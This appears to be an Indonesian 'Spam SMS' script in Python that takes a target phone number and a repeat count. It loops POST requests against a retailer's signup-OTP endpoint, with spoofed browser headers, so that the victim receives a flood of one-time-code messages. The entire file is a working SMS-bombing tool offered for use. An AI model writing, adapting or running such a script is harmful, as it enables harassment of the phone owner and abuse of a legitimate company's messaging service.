#!/usr/bin/python
#coding=utf-8

import os,sys,requests,time
from requests import post

gans = ("""
╔═╗┌─┐┌─┐┌┬┐  ╔═╗┌┬┐╔═╗
╚═╗├─┘├─┤│││  ╚═╗│││╚═╗
╚═╝┴  ┴ ┴┴ ┴  ╚═╝┴ ┴╚═╝
- - - - - - - - - - - -
\x1b[30;1m\x1b[47m Dibuat oleh : Amena Gans \x1b[00m
- - - - - - - - - - - -
""")

print(gans)
nomer = input ('[?] nomer:')
j = int(input ('[!] jumlah:'))
a = {
'Connection':'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Referer': 'https://www.mapclub.com/en/user/signup',
}

dat ={
'phone':nomer,
}

for i in range(j):
	time.sleep(4)
	sd = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=a)
	if 'error' in sd.text:
		print('\x1b[91mspam gagal\x1b[00m',nomer)
	else:
		print('\x1b[92mspam success\x1b[00m',nomer)
